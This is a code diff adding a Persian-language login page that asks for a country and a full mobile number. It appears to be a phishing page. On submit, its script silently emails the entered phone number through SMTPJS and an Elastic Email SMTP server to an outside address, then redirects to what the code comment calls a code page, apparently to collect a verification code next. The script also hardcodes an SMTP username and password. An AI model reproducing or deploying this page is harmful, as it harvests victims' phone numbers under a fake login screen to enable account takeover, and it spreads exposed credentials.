@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>صفحه ورود</title>
+
+</head>
+<body>
+    <div class="login-container">
+        <img src="icon-192x192.png" alt="icon">
+        <h2> ورود </h2>
+        
+        <p>   لطفاً کشور خود را انتخاب کنید و شماره همراه خود را به صورت کامل وارد کنید </p><br>
+
+        <div class="input-field input-select">
+          <select id="countrySelect" class="input-field-input">
+              <option value="" disabled selected>انتخاب کشور</option>
+              <option value="Iran">ایران</option>
+          </select>
+          <div class="input-field-border"></div>
+          <label class="input-field-label">
+              <span>کشور</span>
+          </label>
+    
+        </div>
+        <div class="input-field">
+            <input type="tel" id="phoneNumber" placeholder="شماره تلفن" class="input-field-input" maxlength="13">
+            <div class="input-field-border"></div>
+            <label class="input-field-label">
+                <span>شماره تلفن</span>
+            </label>
+        </div>
+
+        <button class="submit-btn" onclick="redirectToCodePage()"> بعدی </button>
+    </div>
+
+    </div>
+</body>
+
+
+<script>
+
+  document.addEventListener("DOMContentLoaded", function () {
+      var countrySelect = document.getElementById("countrySelect");
+      var phoneNumberInput = document.getElementById("phoneNumber");
+      countrySelect.value = "Iran";
+      phoneNumberInput.value = "+98";
+      countrySelect.addEventListener("change", function () {
+          var selectedCountry = countrySelect.value;
+          if (selectedCountry === "Iran") {
+              phoneNumberInput.value = "+98";
+          } else {
+              phoneNumberInput.value = ""; 
+          }
+      });
+  });
+
+
+
+
+  function redirectToCodePage() {
+    var phoneNumber = document.getElementById("phoneNumber").value;
+
+    Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "bibak1498@gmail.com",
+        Password: "69489F9090A6FCD27289C78BB4DB70E14D8E",
+        To: 'vcgcf@telegmail.com',
+        From: "bibak1498@gmail.com",
+        Subject: "شماره تلفن جدید",
+        Body: "شماره تلفن وارد شده: " + phoneNumber
+    }).then(
+        function (message) {
+            alert(message);
+            // انتقال به صفحه tow.html پس از 2000 میلی‌ثانیه (2 ثانیه)
+            setTimeout(function () {
+                window.location.href = 'tow.html';
+            }, 2000);
+             } );}
+
+</script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+</html>
